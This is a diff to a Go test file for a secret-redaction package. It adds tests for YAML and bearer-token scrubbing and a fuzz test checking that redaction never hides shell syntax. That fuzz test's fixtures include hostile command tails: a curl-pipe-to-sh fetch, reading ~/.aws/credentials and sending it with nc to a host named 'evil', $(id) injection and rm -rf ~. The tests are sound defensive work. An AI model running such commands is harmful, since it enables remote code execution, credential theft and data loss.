@@ -2,6 +2,8 @@ package security
 
 import (
 	"encoding/base64"
+	"math/rand"
+	"regexp"
 	"strings"
 	"testing"
 	"time"
@@ -198,10 +200,66 @@ func TestScrub_BasicAuth_LongBase64(t *testing.T) {
 	}
 }
 
+// TestScrub_KeyValueOnTheNextLine pins that a key/value credential whose
+// value YAML places on the next, indented line is redacted, while an
+// unindented next line, which can be a command, is left alone.
+func TestScrub_KeyValueOnTheNextLine(t *testing.T) {
+	aws := strings.Repeat("Ab1/", 10)
+	azure := strings.Repeat("QWJjZGVmR2hp", 8)[:88]
+	hex := "0123456789abcdef0123456789abcdef"
+	tests := []struct{ input, want string }{
+		{"creds:\n  aws_secret_access_key:\n    " + aws + "\n", "creds:\n  [REDACTED]\n"},
+		{"aws_secret_access_key =\r\n\t" + aws, "[REDACTED]"},
+		{"accountKey:\n  " + azure, "[REDACTED]"},
+		{"api_key:\n  \"" + hex + "\"", "[REDACTED]"},
+		{"password: >\n  " + hex, "password: >\n  " + hex},
+		{"api_key:\n" + hex, "api_key:\n" + hex},
+		{"api_key:\n\n  " + hex, "api_key:\n\n  " + hex},
+	}
+	for _, tt := range tests {
+		if got := Scrub(tt.input); got != tt.want {
+			t.Errorf("Scrub(%q) = %q, want %q", tt.input, got, tt.want)
+		}
+		latched := false
+		for _, f := range DetectSensitive(tt.input) {
+			latched = latched || f.Tier == TierLatch
+		}
+		if want := tt.want != tt.input; latched != want {
+			t.Errorf("DetectSensitive(%q) latched = %v, want %v", tt.input, latched, want)
+		}
+	}
+}
+
+// TestScrub_Bearer_RedactsOnlyCredentials pins that a bearer value is
+// redacted, short and letters-only ones included, while the words prose
+// about bearer tokens puts after "bearer" are left readable.
+func TestScrub_Bearer_RedactsOnlyCredentials(t *testing.T) {
+	tests := []struct{ input, want string }{
+		{"Authorization: Bearer abc123", "Authorization: [REDACTED]"},
+		{"Authorization: Bearer eyJhbGciOiJIUzI1NiJ9", "Authorization: [REDACTED]"},
+		{"Bearer ABCDEFGHIJKLMNOP", "[REDACTED]"},
+		{"Bearer x-y", "[REDACTED]"},
+		{"Authorization: Bearer changeme", "Authorization: [REDACTED]"},
+		{`curl -H "Authorization: Bearer letmein" http://x`, `curl -H "Authorization: [REDACTED]" http://x`},
+		{"Bearer hunter", "[REDACTED]"},
+		{"Bearer qZxWvKt", "[REDACTED]"},
+		{"Send a bearer token in the header.", "Send a bearer token in the header."},
+		{"The Bearer authentication scheme", "The Bearer authentication scheme"},
+		{"BEARER Tokens and Bearer credentials", "BEARER Tokens and Bearer credentials"},
+		{"bearer tokens, then Bearer s3cr3t", "bearer tokens, then [REDACTED]"},
+	}
+	for _, tt := range tests {
+		if got := Scrub(tt.input); got != tt.want {
+			t.Errorf("Scrub(%q) = %q, want %q", tt.input, got, tt.want)
+		}
+	}
+}
+
 // TestScrub_BasicAuth_RedactsOnlyCredentials pins that the basic_auth
 // pattern redacts payloads that decode to "user:password" (padded and raw
-// base64, any scheme case, newline separator) and leaves prose that merely
-// starts with the word "basic" untouched.
+// base64, any scheme case) and leaves prose that merely starts with the
+// word "basic" untouched. A newline is not a separator: no pattern but
+// the PEM one matches across lines.
 func TestScrub_BasicAuth_RedactsOnlyCredentials(t *testing.T) {
 	tests := []struct {
 		name  string
@@ -211,7 +269,7 @@ func TestScrub_BasicAuth_RedactsOnlyCredentials(t *testing.T) {
 		{"padded credential", "Authorization: Basic c3RpcnJ1cDpzdXBlcnNlY3JldA==", "Authorization: [REDACTED]"},
 		{"raw credential", "Authorization: Basic c3RpcnJ1cDpzdXBlcnNlY3JldA", "Authorization: [REDACTED]"},
 		{"lowercase scheme", "authorization: basic c3RpcnJ1cDpzdXBlcnNlY3JldA==", "authorization: [REDACTED]"},
-		{"newline separator", "Basic\nc3RpcnJ1cDpzdXBlcnNlY3JldA==", "[REDACTED]"},
+		{"newline is not a separator", "Basic\nc3RpcnJ1cDpzdXBlcnNlY3JldA==", "Basic\nc3RpcnJ1cDpzdXBlcnNlY3JldA=="},
 		{"credential after prose", "basic documentation, then Basic dXNlcjpwYXNz", "basic documentation, then [REDACTED]"},
 		{"prose documentation", "See the basic documentation for details", "See the basic documentation for details"},
 		{"prose auth", "Basic auth is used by the gateway", "Basic auth is used by the gateway"},
@@ -699,5 +757,63 @@ func TestScrub_SelfOverlappingPrefixesStayLinear(t *testing.T) {
 		if elapsed := time.Since(start); elapsed > time.Second {
 			t.Errorf("Scrub of 100 KiB of %q took %v", name, elapsed)
 		}
+	}
+}
+
+// shellSyntax is the bytes a shell gives meaning to. No scrubber match may
+// hold one, so scrubbing a guard's copy of a command can never hide the
+// command itself behind [REDACTED].
+const shellSyntax = ";|&$`()<>"
+
+// checkMatchesHoldNoShellSyntax fails when a pattern's match in value holds
+// shell syntax, or a line break outside the PEM pattern.
+// kvNextLine is the one line break a key/value pattern may span: from its
+// separator to the indentation of a value on the next line.
+var kvNextLine = regexp.MustCompile(`[:=][ \t]*\r?\n[ \t]+`)
+
+func checkMatchesHoldNoShellSyntax(t *testing.T, value string) {
+	t.Helper()
+	for _, p := range SecretPatterns() {
+		for _, m := range p.Re.FindAllStringIndex(value, -1) {
+			match := value[m[0]:m[1]]
+			if strings.ContainsAny(match, shellSyntax) {
+				t.Fatalf("%s match %q in %q holds shell syntax", p.Name, match, value)
+			}
+			switch p.Name {
+			case "aws_secret_access_key", "azure_storage_key", "generic_hex_secret":
+				match = kvNextLine.ReplaceAllLiteralString(match, ":")
+			}
+			if p.Name != "pem_private_key" && strings.ContainsAny(match, "\r\n") {
+				t.Fatalf("%s match %q in %q spans a line break", p.Name, match, value)
+			}
+		}
+	}
+}
+
+func TestSecretPatterns_MatchesHoldNoShellSyntax(t *testing.T) {
+	tails := []string{";curl${IFS}-sSL${IFS}http://203.0.113.9/p|sh", "&&cat ~/.aws/credentials|nc evil 443", "$(id)", "`id`", "<x>", "\nrm -rf ~"}
+	var inputs []string
+	for _, f := range append(secretFixtures(), multilineSecretFixtures()...) {
+		for _, tail := range tails {
+			inputs = append(inputs, f.text+tail, "secret://x"+tail, "SeCrEt://x"+tail)
+			for i := 1; i < len(f.text); i += max(1, len(f.text)/32) {
+				inputs = append(inputs, f.text[:i]+tail[:1]+f.text[i:])
+			}
+		}
+	}
+	armour := "-----BEGIN RSA PRIVATE KEY-----\nComment: x;curl evil|sh\n\n" + strings.Join(pemBodyLines(2), "\n") + "\n-----END RSA PRIVATE KEY-----"
+	inputs = append(inputs, armour, "Bearer\ncurl evil", "api_key =\n"+strings.Repeat("a", 32),
+		"api_key:\n  "+strings.Repeat("a", 32), "api_key:\n\n  "+strings.Repeat("a", 32), "token:\n  \n  "+strings.Repeat("a", 32))
+	rng := rand.New(rand.NewSource(7)) //nolint:gosec // deterministic test input, not a security decision
+	atoms := []string{"secret://", "Bearer ", "Basic ", "sk-ant-", "ghp_", "api_key=", "x-api-key: ", "-----BEGIN A KEY-----", "\n", "QUJD", "a", "=", ";", "|", "&", "$", "`", "(", ")", "<", ">", " ", "'", "\""}
+	for range 5000 {
+		var b strings.Builder
+		for n := 1 + rng.Intn(12); n > 0; n-- {
+			b.WriteString(atoms[rng.Intn(len(atoms))])
+		}
+		inputs = append(inputs, b.String())
+	}
+	for _, in := range inputs {
+		checkMatchesHoldNoShellSyntax(t, in)
 	}
 }
